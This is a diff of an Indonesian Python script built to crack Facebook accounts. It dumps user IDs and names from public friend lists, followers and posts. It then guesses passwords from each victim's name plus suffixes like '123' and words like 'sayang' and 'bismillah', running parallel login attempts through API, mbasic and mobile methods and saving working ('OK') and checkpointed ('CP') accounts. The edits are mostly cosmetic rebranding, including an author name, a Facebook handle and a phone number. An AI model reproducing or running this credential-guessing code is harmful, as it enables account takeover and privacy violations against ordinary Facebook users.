@@ -85,8 +85,8 @@ logo = '''%s ╦═╗╔═╗╦ ╦   ╦═╗╔╦╗╔╗ ╔═╗
 # crack selesai
 def hasil(ok,cp):
 	if len(ok) != 0 or len(cp) != 0:
-		print '\n\n [%s✓%s] Total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
-		print ' [%s✓%s] Total CP : %s%s%s'%(O,N,K,str(len(cp)),N)
+		print '\n [%s✓%s] Total OK : %s%s%s'%(H,N,H,str(len(ok)),N)
+		print ' [%s✓%s] Total CP : %s%s%s'%(K,N,K,str(len(cp)),N)
 		exit()
 	else:
 		print '\n\n [%s!%s] Maaf kamu tidak mendapatkan hasil Crack :('%(M,N)
@@ -150,7 +150,7 @@ def moch_yayan():
     os.system('clear')
     print logo
     print ' %s[%s*%s] Author   : %sRoy Octa Firdaus'%(N,H,N,K,)
-    print ' %s[%s*%s] Facebook : %sfacebook.com/jbfbold'%(N,H,N,K)
+    print ' %s[%s*%s] Facebook : %sfacebook.com/JbFbOld'%(N,H,N,K)
     print ' %s[%s*%s] Whatsapp : %s081318306972'%(N,H,N,K)
     print ' %s=================================================='%(N)
     print ' %s[%s*%s] Nama FB : %s%s%s'%(N,K,N,K,nama,N)
@@ -313,7 +313,7 @@ def publik():
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
-            print '\r' + w +' [*] Menghitung Total Dump ID : %s ' % str(len(id)),
+            print '\r' + w +' [***] Menghitung Total Dump ID : %s ' % str(len(id)),
             sys.stdout.flush()
             time.sleep(0.0050)
 
@@ -353,7 +353,7 @@ def followers():
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
-            print '\r' + w +' [*] Menghitung Total Dump ID : %s ' % str(len(id)),
+            print '\r' + w +' [***] Menghitung Total Dump ID : %s ' % str(len(id)),
             sys.stdout.flush()
             time.sleep(0.0050)
 
@@ -393,7 +393,7 @@ def postingan():
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
-            print '\r' + w +' [*] Menghitung Total Dump ID : %s ' % str(len(id)),
+            print '\r' + w +' [***] Menghitung Total Dump ID : %s ' % str(len(id)),
             sys.stdout.flush()
             time.sleep(0.0050)
 
@@ -562,7 +562,7 @@ class __crack__:
         try:
             self.apk = raw_input('\n [%s?%s] Masukkan Nama File : '%(K,N))
             self.id = open(self.apk).read().splitlines()
-            print '\n [%s*%s] Menghitung Total ID : %s%s%s' %(H,N,M,len(self.id),N)
+            print ' [%s***%s] Menghitung Total ID : %s%s%s' %(H,N,M,len(self.id),N)
         except:
             print '\n %s[%s!%s] File [%s%s%s] tidak ada, Silahkan dump ID terlebih dahulu!'%(N,M,N,M,self.apk,P)
             time.sleep(3)
@@ -594,7 +594,7 @@ class __crack__:
                                     except:
                                         pass
 
-                            print '\n\n %s[%s✓%s] Proses Crack Selesai...'%(N,K,N)
+                            print '\n\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
                             os.remove(self.apk)
                             hasil(ok,cp)
                             exit()
@@ -610,7 +610,7 @@ class __crack__:
                                     except:
                                         pass
 
-                            print '\n\n %s[%s✓%s] Proses Crack Selesai...'%(N,K,N)
+                            print '\n\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
                             os.remove(self.apk)
                             hasil(ok,cp)
                             exit()
@@ -626,7 +626,7 @@ class __crack__:
                                     except:
                                         pass
 
-                            print '\n\n %s[%s✓%s] Proses Crack Selesai...'%(N,K,N)
+                            print '\n\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
                             os.remove(self.apk)
                             hasil(ok,cp)
                             exit()
@@ -634,18 +634,20 @@ class __crack__:
                             print '\n %s[%s!%s] Isi dengan bener!'%(N,M,N)
                             time.sleep(2)
                             moch_yayan()
-                    print '\n [ Pilih Method login Anda. Silahkan coba satu² ]\n'
-                    print ' %s[%s1%s] Method API (%sProses Cepat%s)'%(N,H,N,M,N)
-                    print ' %s[%s2%s] Method mbasic (%sProses Slow%s)'%(N,H,N,K,N)
-                    print ' %s[%s3%s] Method mobile (%sProses Sangat Slow%s)'%(N,H,N,H,N)
+                    print '\n %s=================================================='%(N)
+                    print ' %s[%s?%s] Pilih Method login Anda. Silahkan coba satu²'%(N,K,N)
+                    print ' %s[%s1%s] Method %sb-api %s(%sProses Cepat%s)'%(N,H,N,O,N,M,N)
+                    print ' %s[%s2%s] Method %smbasic %s(%sProses Slow%s)'%(N,H,N,O,N,K,N)
+                    print ' %s[%s3%s] Method %smobile %s(%sProses Sangat Slow%s)'%(N,H,N,O,N,H,N)
                     __yan__(pwek.split(','))
                     break
 
         elif ___yayanganteng___ in ('T', 't'):
-            print '\n [ Pilih Method login Anda. Silahkan coba satu² ]\n'
-            print ' %s[%s1%s] Method API (%sProses Cepat%s)'%(N,H,N,M,N)
-            print ' %s[%s2%s] Method mbasic (%sProses Slow%s)'%(N,H,N,K,N)
-            print ' %s[%s3%s] Method mobile (%sProses Sangat Slow%s)'%(N,H,N,H,N)
+            print '\n %s=================================================='%(N)
+            print ' %s[%s?%s] Pilih Method login Anda. Silahkan coba satu²'%(N,K,N)
+            print ' %s[%s1%s] Method %sb-api %s(%sProses Cepat%s)'%(N,H,N,O,N,M,N)
+            print ' %s[%s2%s] Method %smbasic %s(%sProses Slow%s)'%(N,H,N,O,N,K,N)
+            print ' %s[%s3%s] Method %smobile %s(%sProses Sangat Slow%s)'%(N,H,N,O,N,H,N)
             self.__pler__()
         else:
             print '\n %s[%sx%s] y/t !'%(N,M,N)
@@ -773,9 +775,11 @@ class __crack__:
         if yan == '':
             self.__pler__()
         elif yan in ('1', '01'):
-            print '\n [%s✓%s] Hasil OK ke : results/OK-%s-%s-%s.txt' % (H,N,ha, op, ta)
+            print '\n %s=================================================='%(N)
+            print ' [%s✓%s] Hasil OK ke : results/OK-%s-%s-%s.txt' % (H,N,ha, op, ta)
             print ' [%s✓%s] Hasil CP ke : results/CP-%s-%s-%s.txt' % (K,N,ha, op, ta)
-            print '\n [%s!%s] Anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
+            print ' %s=================================================='%(N)
+            print '\n [%s!%s] Matikan data selular untuk menjeda/refresh proses crack'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
                 for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -784,14 +788,15 @@ class __crack__:
                         if len(xz) == 1 or len(xz) == 2 or len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                             	raimuuu = [
                         		xz[0], xz[0]+'123', xz[0]+'12345', 
-                        		xz[1], xz[1]+'123', xz[1]+'12345',
+                        		xz[1], xz[1]+'123', xz[1]+'12345', 
+					'sayang', 'bismillah',
                         	]
                         elif len(xz) == 3:
                         	raimuuu = [
                         		xz[0], xz[0]+'123', xz[0]+'12345', 
                         		xz[1], xz[1]+'123', xz[1]+'12345', 
                         		xz[2], xz[2]+'123', xz[2]+'12345', 
-					'sayang',
+					'sayang', 'bismillah',
                         	]
                         elif len(xz) == 4:
                         	raimuuu = [
@@ -805,14 +810,16 @@ class __crack__:
                     except:
                         pass
 
-            print '\n\n %s[%s✓%s] Proses Crack Selesai...'%(N,K,N)
+            print '\n\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
             os.remove(self.apk)
             hasil(ok,cp)
             exit()
         elif yan in ('2', '02'):
-            print '\n [%s✓%s] Hasil OK ke : results/OK-%s-%s-%s.txt' % (H,N,ha, op, ta)
+            print '\n %s=================================================='%(N)
+            print ' [%s✓%s] Hasil OK ke : results/OK-%s-%s-%s.txt' % (H,N,ha, op, ta)
             print ' [%s✓%s] Hasil CP ke : results/CP-%s-%s-%s.txt' % (K,N,ha, op, ta)
-            print '\n [%s!%s] Anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
+            print ' %s=================================================='%(N)
+            print '\n [%s!%s] Matikan data selular untuk menjeda/refresh proses crack'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
                 for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -820,37 +827,39 @@ class __crack__:
                         xz = bb[1].split(' ')
                         if len(xz) == 1 or len(xz) == 2 or len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                             	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345',
-                        		xz[1], xz[1]+'123', xz[1]+'12345',
+                        		xz[0], xz[0]+'123', xz[0]+'12345', 
+                        		xz[1], xz[1]+'123', xz[1]+'12345', 
 					'sayang', 'bismillah',
                         	]
                         elif len(xz) == 3:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345',
-                        		xz[1], xz[1]+'123', xz[1]+'12345',
-                        		xz[2], xz[2]+'123', xz[2]+'12345',
+                        		xz[0], xz[0]+'123', xz[0]+'12345', 
+                        		xz[1], xz[1]+'123', xz[1]+'12345', 
+                        		xz[2], xz[2]+'123', xz[2]+'12345', 
 					'sayang', 'bismillah',
                         	]
                         elif len(xz) == 4:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345',
-                        		xz[1], xz[1]+'123', xz[1]+'12345',
-                        		xz[2], xz[2]+'123', xz[2]+'12345',
-                        		xz[3], xz[3]+'123', xz[3]+'12345',
+                        		xz[0], xz[0]+'123', xz[0]+'12345', 
+                        		xz[1], xz[1]+'123', xz[1]+'12345', 
+                        		xz[2], xz[2]+'123', xz[2]+'12345', 
+                        		xz[3], xz[3]+'123', xz[3]+'12345', 
 					'sayang', 'bismillah',
                         	]
                         __yayanXD__.submit(self.__mbasic__, bb[0], raimuuu)
                     except:
                         pass
 
-            print '\n\n %s[%s✓%s] Proses Crack Selesai...'%(N,K,N)
+            print '\n\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
             os.remove(self.apk)
             hasil(ok,cp)
             exit()
         elif yan in ('3', '03'):
-            print '\n [%s✓%s] Hasil OK ke : results/OK-%s-%s-%s.txt' % (H,N,ha, op, ta)
+            print '\n %s=================================================='%(N)
+            print ' [%s✓%s] Hasil OK ke : results/OK-%s-%s-%s.txt' % (H,N,ha, op, ta)
             print ' [%s✓%s] Hasil CP ke : results/CP-%s-%s-%s.txt' % (K,N,ha, op, ta)
-            print '\n [%s!%s] Anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
+            print ' %s=================================================='%(N)
+            print '\n [%s!%s] Matikan data selular untuk menjeda/refresh proses crack'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
                 for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -858,30 +867,30 @@ class __crack__:
                         xz = bb[1].split(' ')
                         if len(xz) == 1 or len(xz) == 2 or len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                             	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345',
-                        		xz[1], xz[1]+'123', xz[1]+'12345',
+                        		xz[0], xz[0]+'123', xz[0]+'12345', 
+                        		xz[1], xz[1]+'123', xz[1]+'12345', 
 					'sayang', 'bismillah',
                         	]
                         elif len(xz) == 3:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345',
-                        		xz[1], xz[1]+'123', xz[1]+'12345',
-                        		xz[2], xz[2]+'123', xz[2]+'12345',
+                        		xz[0], xz[0]+'123', xz[0]+'12345', 
+                        		xz[1], xz[1]+'123', xz[1]+'12345', 
+                        		xz[2], xz[2]+'123', xz[2]+'12345', 
 					'sayang', 'bismillah',
                         	]
                         elif len(xz) == 4:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345',
-                        		xz[1], xz[1]+'123', xz[1]+'12345',
-                        		xz[2], xz[2]+'123', xz[2]+'12345',
-                        		xz[3], xz[3]+'123', xz[3]+'12345',
+                        		xz[0], xz[0]+'123', xz[0]+'12345', 
+                        		xz[1], xz[1]+'123', xz[1]+'12345', 
+                        		xz[2], xz[2]+'123', xz[2]+'12345', 
+                        		xz[3], xz[3]+'123', xz[3]+'12345', 
 					'sayang', 'bismillah',
                         	]
                         __yayanXD__.submit(self.__mfb__, bb[0], raimuuu)
                     except:
                         pass
 
-            print '\n\n %s[%s✓%s] Proses Crack Selesai...'%(N,K,N)
+            print '\n\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
             os.remove(self.apk)
             hasil(ok,cp)
             exit()
